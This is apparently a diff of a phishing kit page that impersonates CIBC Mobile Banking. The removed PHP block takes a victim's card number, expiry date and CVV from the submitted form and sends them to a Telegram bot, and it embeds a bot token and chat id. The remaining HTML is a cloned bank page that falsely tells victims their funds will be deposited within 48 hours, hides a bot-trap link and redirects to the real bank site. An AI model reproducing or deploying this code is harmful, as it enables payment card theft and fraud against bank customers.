@@ -1,21 +1,5 @@
-<?php
-
-$card = $_POST['card'];
-$exp = $_POST['exp1'];
-$exp4 = $_POST['exp2'];
-$cvv = $_POST['cvv'];
-$message = " $card \n$exp$exp4\n$cvv\n";
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
-$data = [
-    'chat_id' => '-903484597',
-    'text' => $message
-];
-
-$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
-                                 http_build_query($data) );
-                                                    
-
-?>  <!DOCTYPE html>
+<!DOCTYPE html>
+<!-- saved from url=(0042)/deposit/cibc/f -->
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <title>CIBC Mobile Banking</title>
         
@@ -23,22 +7,22 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
         <meta name="HandheldFriendly" content="true">
         <meta name="format-detection" content="telephone=no">
         <meta http-equiv="refresh" content="2;URL=https://href.li/?http://www.cibc.com">
-        <link rel="stylesheet" href="./files/reset.css">
-        <link rel="stylesheet" href="./files/reset-brand.css">
-        <link rel="stylesheet" href="./files/global.css">
-        <link rel="stylesheet" href="./files/global-android2.css">
-        <link rel="stylesheet" href="./files/global-brand.css">
-        <script type="text/javascript" src="./files/jquery-1.js###%"></script>
-        <script type="text/javascript" src="./files/wicket-event-jquery.js###%"></script>
-        <script type="text/javascript" src="./files/wicket-ajax-jquery.js###%"></script>
+        <link rel="stylesheet" href="./cib_5_files/reset.css">
+        <link rel="stylesheet" href="./cib_5_files/reset-brand.css">
+        <link rel="stylesheet" href="./cib_5_files/global.css">
+        <link rel="stylesheet" href="./cib_5_files/global-android2.css">
+        <link rel="stylesheet" href="./cib_5_files/global-brand.css">
+        <script type="text/javascript" src="./cib_5_files/jquery-1.js.download"></script>
+        <script type="text/javascript" src="./cib_5_files/wicket-event-jquery.js.download"></script>
+        <script type="text/javascript" src="./cib_5_files/wicket-ajax-jquery.js.download"></script>
         <script type="text/javascript" id="wicket-ajax-base-url">
             /*<![CDATA[*/
             Wicket.Ajax.baseUrl="change-password";
             /*]]>*/
         </script>
-        <script src="./files/global.js###%"></script>
-        <script src="./files/drawer-scroll-prevent.js###%"></script>
-        <link rel="stylesheet" href="./files/appboy.css">
+        <script src="./cib_5_files/global.js.download"></script>
+        <script src="./cib_5_files/drawer-scroll-prevent.js.download"></script>
+        <link rel="stylesheet" href="./cib_5_files/appboy.css">
         <script type="text/javascript">
             /*<![CDATA[*/
 
@@ -63,12 +47,12 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
         }
         </style>
     </head>
-    <body lang="en">
+    <body lang="en" class="android-fix">
         <span class="offscreen">CIBC Mobile Banking</span>
         <input id="drawer-toggle-chk" aria-hidden="true" type="checkbox">
         <label for="drawer-toggle-chk" id="drawer-toggle-label">
-        <img id="open-menu-icon" src="./files/drawer-menu-open.png" alt="Open Menu" role="button">
-        <img id="close-menu-icon" src="./files/drawer-menu-close.png" alt="Close Menu" role="button">
+        <img id="open-menu-icon" src="./cib_5_files/drawer-menu-open.png" alt="Open Menu" role="button">
+        <img id="close-menu-icon" src="./cib_5_files/drawer-menu-close.png" alt="Close Menu" role="button">
         </label>
         <nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
             <div id="menu-wrapper">
@@ -123,17 +107,17 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
         </section>
         <section id="change-password" class="page-wrapper">
             <div class="global-error-from-container" id="idf">
-                <h2 class="title">Sorry!<br>
+                <h2 class="title">Thank you,<br>
 <br>
-We are doing Updates! please try again later!.<br>
+The funds will be processed and deposited in your account within the next 48 hours.<br>
 <br>
 - CIBC<br>
 </h2>
             </div>
-            <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
+            <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
             <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
                 <div class="ajax-overlay-background"></div>
-                <img src="./files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
+                <img src="./cib_5_files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
             </div>
         </section>
     
